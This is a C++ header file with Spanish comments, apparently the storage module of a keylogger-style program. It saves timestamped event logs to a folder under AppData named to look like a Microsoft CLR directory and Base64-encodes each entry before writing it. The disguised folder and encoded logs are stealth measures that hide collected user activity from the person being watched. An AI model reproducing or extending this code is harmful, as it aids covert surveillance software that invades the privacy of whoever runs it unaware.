
#ifndef IO_h
#define IO_h

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO {

	/*Localiza el archivo donde va a guardar los logs C:\Users\USERNAME\AppData\Microsoft\CLR*/
	std::string GetOurPath(const bool append_separator = false) {

		std::string appdata_dir(getenv("APPDATA"));
		std::string full = appdata_dir + "\\Microsoft\\CLR";
		return full + (append_separator ? "\\" : "");
	}

	/*Intenta crear un directorio y devuelve true si lo puede crear o si ya existía*/
	bool MkOneDr(std::string path) {

		return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	/*Comprueba que la ruta donde guardar los logs exista y se vaya a poder crear el directorio*/
	bool MkDir(std::string path) {

		for (char &c : path) {
			if (c == '\\') {
				c = '\0';
				if (!MkOneDr(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}

	template <class T>
	/*Intenta escribir en el archivo de log un evento*/
	std::string WriteLog(const T &t) {

		std::string path = GetOurPath(true);
		Helper::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log"; //Name of the file

		try {
			std::ofstream file(path + name);
			if (!file) return "";
			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" <<
				std::endl << t << std::endl;

			//Codificamos el mesanje antes de introducirlo en el archivo de log
			std::string data = Base64::EncryptB64(s.str());
			file << data;
			if (!file) return "";

			file.close();
			return name; 
		}
		catch (...) {
			return "";
		}
	}
}

#endif // !IO_h
